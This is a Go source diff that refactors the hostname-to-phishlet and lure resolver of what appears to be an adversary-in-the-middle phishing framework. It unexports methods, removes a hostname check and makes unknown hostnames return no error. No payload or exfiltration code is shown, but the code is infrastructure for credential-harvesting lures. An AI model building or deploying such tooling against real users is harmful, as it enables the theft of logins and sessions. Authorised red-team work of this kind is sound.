@@ -6,11 +6,11 @@ import (
 	"sync"
 )
 
-// PhishletResolver maps request hostnames to their phishlet and lure.
+// phishletResolver maps request hostnames to their phishlet and lure.
 // All phishlet and lure state is held in memory.
 // Register must be called whenever a phishlet's rules or operator config changes.
 // InvalidateLures must be called whenever a lure is created, updated, or deleted.
-type PhishletResolver struct {
+type phishletResolver struct {
 	mu        sync.RWMutex
 	phishlets map[string]*Phishlet // name → phishlet
 	hostnames map[string]*Phishlet // lowercase hostname → phishlet (enabled only)
@@ -19,8 +19,8 @@ type PhishletResolver struct {
 	lures     []*Lure // cached; refreshed by InvalidateLures
 }
 
-func NewPhishletResolver(lureStore lureStore) *PhishletResolver {
-	return &PhishletResolver{
+func newPhishletResolver(lureStore lureStore) *phishletResolver {
+	return &phishletResolver{
 		phishlets: make(map[string]*Phishlet),
 		hostnames: make(map[string]*Phishlet),
 		lureStore: lureStore,
@@ -29,24 +29,27 @@ func NewPhishletResolver(lureStore lureStore) *PhishletResolver {
 
 // LoadLuresFromDB populates the in-memory lure cache from the store.
 // Call once at startup before serving requests.
-func (r *PhishletResolver) LoadLuresFromDB() error {
+func (r *phishletResolver) loadLuresFromDB() error {
 	lures, err := r.lureStore.ListLures()
 	if err != nil {
 		return fmt.Errorf("loading lures: %w", err)
 	}
+
 	r.luresMu.Lock()
 	r.lures = lures
 	r.luresMu.Unlock()
+
 	return nil
 }
 
 // InvalidateLures reloads the lure cache from the store. Call after any lure mutation.
 // On store error the stale cache is kept so in-flight requests are not disrupted.
-func (r *PhishletResolver) InvalidateLures() {
+func (r *phishletResolver) invalidateLures() {
 	lures, err := r.lureStore.ListLures()
 	if err != nil {
 		return
 	}
+
 	r.luresMu.Lock()
 	r.lures = lures
 	r.luresMu.Unlock()
@@ -55,7 +58,7 @@ func (r *PhishletResolver) InvalidateLures() {
 // Register stores p in both indexes. If p is enabled and has a non-empty hostname
 // it becomes reachable by hostname. Replaces any previously registered entry with
 // the same name, cleaning up the old hostname index entry if the hostname changed.
-func (r *PhishletResolver) Register(p *Phishlet) {
+func (r *phishletResolver) register(p *Phishlet) {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
@@ -70,40 +73,35 @@ func (r *PhishletResolver) Register(p *Phishlet) {
 }
 
 // Get returns the registered phishlet by name, or nil if not registered.
-func (r *PhishletResolver) Get(name string) *Phishlet {
+func (r *phishletResolver) get(name string) *Phishlet {
 	r.mu.RLock()
 	defer r.mu.RUnlock()
-	return r.phishlets[name]
-}
 
-// ContainsHostname reports whether hostname belongs to an active registered phishlet.
-func (r *PhishletResolver) ContainsHostname(hostname string) bool {
-	r.mu.RLock()
-	defer r.mu.RUnlock()
-	_, ok := r.hostnames[strings.ToLower(hostname)]
-	return ok
+	return r.phishlets[name]
 }
 
 // OwnerOf returns the name of the enabled phishlet that owns hostname, or ""
 // if no phishlet is registered for it.
-func (r *PhishletResolver) OwnerOf(hostname string) string {
+func (r *phishletResolver) ownerOf(hostname string) string {
 	r.mu.RLock()
 	defer r.mu.RUnlock()
+
 	if p, ok := r.hostnames[strings.ToLower(hostname)]; ok {
 		return p.Name
 	}
+
 	return ""
 }
 
 // ResolveHostname returns the phishlet and best-matching lure for a request.
 // When multiple lures share a phishlet, the longest path prefix wins.
-func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
+func (r *phishletResolver) resolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
 	r.mu.RLock()
 	p, ok := r.hostnames[strings.ToLower(hostname)]
 	r.mu.RUnlock()
 
 	if !ok {
-		return nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
+		return nil, nil, nil
 	}
 
 	r.luresMu.RLock()
@@ -116,6 +114,7 @@ func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*Phishlet,
 		if lure.Phishlet != p.Name {
 			continue
 		}
+
 		if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
 			if len(lure.Path) > matchLen {
 				matched = lure
